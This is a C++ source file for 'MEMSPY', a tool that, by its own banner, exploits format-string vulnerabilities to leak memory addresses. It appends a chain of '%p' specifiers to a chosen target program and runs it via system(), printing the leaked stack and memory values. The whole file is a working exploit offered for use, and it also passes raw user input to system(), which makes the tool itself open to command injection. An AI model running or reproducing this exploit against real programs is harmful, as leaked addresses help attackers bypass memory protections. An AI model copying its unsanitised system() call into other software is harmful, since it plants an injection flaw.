#include <iostream>
#include <cstdlib>
#include <string>
#include <unistd.h>
#include <vector>
#include <sstream>
#include <iomanip>
#include <sys/stat.h>
#include <cstring>

using namespace std;

const int MAX_ADDRESSES = 100;
const int DELAY_MICROSECONDS = 100000;

#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define RESET   "\033[0m"

void print_banner() {
    cout << RED << R"(


  ███╗   ███╗███████╗███╗   ███╗███████╗██████╗ ██╗   ██╗
  ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗╚██╗ ██╔╝
  ██╔████╔██║█████╗  ██╔████╔██║███████╗██████╔╝ ╚████╔╝ 
  ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║╚════██║██╔═══╝   ╚██╔╝  
  ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║███████║██║        ██║   
  ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝        ╚═╝   
                                                           
)" << endl;
    cout << YELLOW <<"Exploit For Format String attack to leak memory addresses - By Hamza (bugbounty88)\n\n";
}

void print_usage(const char* prog_name) {
    cerr << BLUE << "Usage: " << prog_name << " <program> <number-of-addresses> \n";
}

vector<string> generate_payload(const string& program, int address_count) {
    vector<string> payloads;
    string base_payload = program + " ";
    
    for (int i = 0; i < address_count; i++) {
        base_payload += "%p";
        if (i != address_count - 1) {
            base_payload += ".";
        }
    }
    
    payloads.push_back(base_payload);
    return payloads;
}

void execute_payload(const vector<string>& payloads) {
    cout << GREEN <<"Memory Addresses: " << endl;
    
    for (const auto& payload : payloads) {
        int ret = system(payload.c_str());
        if (ret != 0) {
            cerr << RED <<"Error executing payload: " << payload << endl;
        }
        usleep(100000); // 0.1 second delay
    }
}

int main(int argc, char* argv[]) {
    print_banner();
    if (argc < 3) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    string program = argv[1];
    int address_count = atoi(argv[2]);
    
    if (address_count > 500){
    	cerr << RED << "Error: Number of addresses must be less than 500" << endl;
    	return EXIT_FAILURE;
    }
    
    if (address_count <= 0) {
        cerr << RED << "Error: Number of addresses must be positive" << endl;
        return EXIT_FAILURE;
    }

    vector<string> payloads = generate_payload(program, address_count);
    execute_payload(payloads);

    cout << BLUE <<"\nAll CopyRights For Hamza (bugbounty88)" << endl;
    return EXIT_SUCCESS;
} 
